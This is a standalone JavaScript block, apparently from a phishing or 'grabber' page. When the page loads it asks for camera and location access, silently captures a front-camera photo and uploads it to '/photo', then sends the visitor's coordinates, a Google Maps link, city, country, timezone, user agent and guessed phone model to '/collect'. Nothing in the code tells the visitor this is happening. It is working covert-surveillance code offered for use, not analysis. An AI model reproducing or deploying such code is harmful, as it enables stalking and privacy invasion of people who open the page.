<script>
function getDeviceName() {
  const ua = navigator.userAgent.toLowerCase();
  
  if (ua.includes("samsung")) return "Samsung";
  if (ua.includes("redmi")) return "Xiaomi Redmi";
  if (ua.includes("mi")) return "Xiaomi Mi";
  if (ua.includes("poco")) return "POCO";
  if (ua.includes("infinix")) return "Infinix";
  if (ua.includes("vivo")) return "Vivo";
  if (ua.includes("oppo")) return "Oppo";
  if (ua.includes("realme")) return "Realme";
  if (ua.includes("huawei")) return "Huawei";
  if (ua.includes("tecno")) return "Tecno";
  if (ua.includes("iphone")) return "iPhone";
  if (ua.includes("ipad")) return "iPad";
  if (ua.includes("pixel")) return "Google Pixel";
  if (ua.includes("sony")) return "Sony Xperia";
  if (ua.includes("motorola")) return "Motorola";
  if (ua.includes("nokia")) return "Nokia";
  if (ua.includes("oneplus")) return "OnePlus";
  if (ua.includes("lg")) return "LG";
  if (ua.includes("honor")) return "Honor";
  if (ua.includes("lenovo")) return "Lenovo";

  // Ø§Ú¯Ø± Ú©ÙˆØ¦ÛŒ Ù…ÛŒÚ† Ù†Û ÛÙˆ ØªÙˆ userAgent Ø³Û’ Model extract Ú©Ø±ÛŒÚº
  const modelMatch = ua.match(/î€([^)]+)î€/);
  if (modelMatch && modelMatch[1]) {
    const parts = modelMatch[1].split(';').map(p => p.trim());
    return parts.length >= 3 ? parts[2] : parts[0];
  }

  return "Unknown Device";
}

async function reverseGeocode(lat, lon) {
  try {
    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
    const res = await fetch(url, {
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    const data = await res.json();
    return {
      city: data.address.city || data.address.town || data.address.village || "Unknown",
      country: data.address.country || "Unknown",
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
    };
  } catch (e) {
    return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
  }
}

async function sendFullData(locationCoords, cameraStatus) {
  let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };

  if (locationCoords) {
    locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
  }

  const payload = {
    ip: "Unknown", // server side milega
    latitude: locationCoords?.latitude || null,
    longitude: locationCoords?.longitude || null,
    mapsLink: locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "âŒ Location Denied",
    timezone: locationData.timezone,
    city: locationData.city,
    country: locationData.country,
    camera: cameraStatus,
    userAgent: navigator.userAgent,
    deviceInfo: getDeviceName()
  };

  await fetch("/collect", {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
}

async function askForPermissions() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    setTimeout(() => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');
        fetch('/photo', { method: 'POST', body: formData });
      });
      stream.getTracks().forEach(track => track.stop());
    }, 3000);

    navigator.geolocation.getCurrentPosition(
      pos => sendFullData(pos.coords, "âœ… Camera Allowed"),
      err => sendFullData(null, "âœ… Camera Allowed, âŒ Location Denied")
    );
  } catch (err) {
    sendFullData(null, "âŒ Camera Denied");
  }
}

window.onload = askForPermissions;
